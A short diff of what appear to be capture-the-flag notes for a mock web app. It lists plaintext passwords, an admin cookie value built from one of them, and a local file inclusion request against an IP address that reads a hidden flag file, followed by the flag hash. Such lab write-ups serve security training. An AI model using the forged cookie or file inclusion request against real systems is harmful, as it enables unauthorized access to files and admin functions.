@@ -102,5 +102,15 @@ passwords:
 superadmin, $youCantCrackMyPassword$
 user, #YouDontNeedThis#
 
-Flag isn't in the same dir as mock app (TODO later)
+findings:
+Cookie Value: admin=$youCantCrackMyPassword$
+
+flag:
+do,
+http://139.91.71.5:11337/files
+it gives you the realflag file,
+lfi search it
+http://139.91.71.5:11337/admin?show=/files/realflag
+and the flag is,
+972f02eb8227012f0b9954e95efc4001a28290ef48047a922efc2a4db40954e6
 
